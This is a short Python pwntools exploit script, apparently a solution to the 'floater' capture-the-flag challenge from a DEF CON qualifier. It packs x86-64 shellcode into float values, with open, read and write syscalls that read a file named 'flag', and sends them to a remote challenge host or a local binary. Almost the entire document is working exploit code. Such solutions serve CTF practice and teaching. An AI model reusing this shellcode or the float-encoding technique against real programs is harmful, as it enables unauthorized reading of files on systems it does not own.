#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
import struct
import math
context.arch="amd64"

if "remote" in sys.argv:
    r = remote("floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me", 754)
else:
    r = process("./floater")

def get_float(code):
    f = struct.unpack("f",code)[0]
    return f

payload = [
        # open
        "\x5f\x5f\x5f\xe9",
        "\x5f\x5f\x5f\xe9",
        "\x5f\x5f\x5f\xe9",
        "\x5f\x5f\x5f\xe9",
        "\x57\x54\x5f\xe9", # push rsp / pop rdi
        "\x6a\x02\x58\xe9", # push 2 / pop rax
        "\x48\x31\xf6\xe9", # xor rsi, rsi
        "\x99\x0f\x05\xe9", # cdq / syscall
        # read
        "\x90\x50\x5f\xe9", # push rax, pop rdi
        "\x48\x31\xc0\xe9", # xor rax, rax
        "\x90\x54\x5e\xe9", # push rsp, pop rsi
        "\x4c\x87\xda\xe9", # xchg rdx, r11
        "\x90\x0f\x05\xe9", # syscall
        # write
        "\x90\x48\x92\xe9", # xchg rdx, rax
        "\x6a\x01\x58\xe9", # push 1 / pop rax
        "\x90\x50\x5f\xe9", # mov rdi, rax
        "\x90\x0f\x05\xe9", # syscall
]

for i in payload + ['\0\0\0\0'] * (24 - len(payload)):
    r.sendline(str(get_float(i)))

r.sendline("flag")

r.interactive()
